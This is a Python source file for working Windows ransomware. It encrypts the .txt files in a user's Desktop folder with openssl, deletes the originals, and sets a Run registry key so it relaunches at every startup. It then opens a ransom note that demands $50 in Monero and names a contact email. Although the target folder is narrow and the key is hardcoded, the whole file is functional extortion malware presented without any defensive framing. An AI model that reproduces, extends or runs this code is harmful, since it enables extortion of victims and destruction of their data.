import os
import hashlib
import subprocess
import shutil
import sys
import winreg
from time import sleep
from random import uniform
import getpass
import signal

# Directory to encrypt
dir_path = f'C:\\Users\\{getpass.getuser()}\\Desktop\\EncryptThis'

# RANSOM STEPS FILE NAME
ransom_steps = 'STEPS_TO_DECRYPT'

# SHA256 hash function
def sha256_hash(string):
    if isinstance(string, bytes):
        return hashlib.sha256(string).hexdigest()
    return hashlib.sha256(string.encode('utf-8')).hexdigest()

# Encrypt files in given directory with new extension
def encrypt_files(directory, key):
    for subdir, dirs, files in os.walk(directory):
        for file in files:
            if file != (ransom_steps + '.txt') and file.endswith('.txt'):
                file_path = os.path.join(subdir, file)
                new_file_path = file_path + '.whoops'
                openssl_command = f'openssl enc -aes-256-cbc -md sha512 -pbkdf2 -iter 100000 -salt -in "{file_path}" -out "{new_file_path}" -k "{key}"'
                subprocess.call(openssl_command)
                os.remove(file_path)

# Decrypt encrypted files in given directory back to original
def decrypt_files(directory, key):
    files_decrypted = False
    for subdir, dirs, files in os.walk(directory):
        for file in files:
            if file.endswith('.whoops'):
                file_path = os.path.join(subdir, file)
                new_file_path = file_path[:-6]
                openssl_command = f'openssl enc -d -aes-256-cbc -md sha512 -pbkdf2 -iter 100000 -in "{file_path}" -out "{new_file_path}" -k "{key}"'
                subprocess.call(openssl_command)
                os.remove(file_path)
                print(f'File {file_path} decrypted successfully.')
                files_decrypted = True
    if files_decrypted:
        # Delete startup registry key once files are decrypted
        key_path = 'SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run'
        key_name = 'whoops'
        try:
            registry_key = winreg.OpenKey(winreg.HKEY_CURRENT_USER, key_path, 0, winreg.KEY_WRITE)
            winreg.DeleteValue(registry_key, key_name)
            winreg.CloseKey(registry_key)
            note_file = dir_path + f'\\{ransom_steps}' + '.txt'
            os.remove(note_file)
            print('Steps for decryption file removed.')
            sleep(uniform(0, 2))
            print('Files decrypted successfully.')
            sleep(uniform(0, 2))
            print("Program startup lock removed.")
            print("Close this window. You are free.")
        except Exception as e:
            pass

def main():

    # 16 bit key
    key = b'whoops_whoops_69'

    if not os.path.exists(dir_path):
        print(f'Directory {dir_path} does not exist. Consider yourself lucky.\nExiting program')
        exit(1)

    # Add registry key to run .exe on Windows startup
    key_path = 'SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run'
    key_name = 'whoops'
    exe_path = os.path.abspath(sys.argv[0])
    try:
        registry_key = winreg.OpenKey(winreg.HKEY_CURRENT_USER, key_path, 0, winreg.KEY_WRITE)
        winreg.SetValueEx(registry_key, key_name, 0, winreg.REG_SZ, exe_path)
        winreg.CloseKey(registry_key)
        print('Start: 1')
    except Exception as e:
        print('Start: 0')

    # Open Notepad with decrypt instructions
    notepad_file = os.path.join(dir_path, 'STEPS_TO_DECRYPT.txt')
    with open(notepad_file, 'a') as f:
        f.write('''
        -----------------------------------------------------------------------------------------------------------
        YOUR SYSTEM HAS BEEN INFECTED AND YOUR TEXT (.txt) FILES HAVE BEEN ENCRYPTED

        YOU HAVE 24 HOURS TO DECRYPT YOUR FILES. FOLLOW THE FOLLOWING STEPS:

        1. SEND $50 USD WORTH OF MONERO (XMR) TO THE FOLLOWING ADDRESS: <address>

        2. SEND 'PAID' TO THE FOLLOWING EMAIL, ALONG WITH THE ADDRESS YOU SENT WITH TO: 69whoops.decrypt@proton.me
        *WE NEED PROOF OF PAYMENT. FIGURE IT OUT*

        3. YOU WILL GET AN EMAIL BACK WITHIN 12 HOURS WITH THE DECRYPTION KEY. 
        JUST ENTER IT INTO THE PROMPT 'Enter Key: ' IN THE TERMINAL WINDOW, THEN PRESS ENTER

        4. YOU WILL BE NOTIFIED THAT YOUR FILES ARE BEING DECRYPTED IN THE TERMINAL WINDOW

        5. ONCE YOU'RE TOLD TO CLOSE THE WINDOW, YOUR SYSTEM IS NO LONGER INFECTED. TRUST US

        DO NOT ATTEMPT TO DECRYPT WITHOUT THE KEY. DOING SO WILL CAUSE PERMENANT DATA LOSS.

        CLOSING THE TERMINAL WINDOW BEFORE DECRYPTION MAY RESULT IN PERMENANT DATA LOSS
        -----------------------------------------------------------------------------------------------------------
        ''')
    proc = subprocess.Popen(['notepad.exe', notepad_file])
    notepad_pid = proc.pid

    # Encrypt files in directory
    encrypt_files(dir_path, key)

    # Prompt for decryption key
    input_key = input('Enter key: ')

    # Decrypt encrypted files if key is correct
    if input_key.encode('utf-8') == key:
        decrypt_files(dir_path, key)
        os.kill(notepad_pid, signal.SIGTERM)
    else:
        print('Invalid key. Unable to decrypt files.')

    sleep(86400) # 24 HOURS

if __name__ == '__main__':
    main()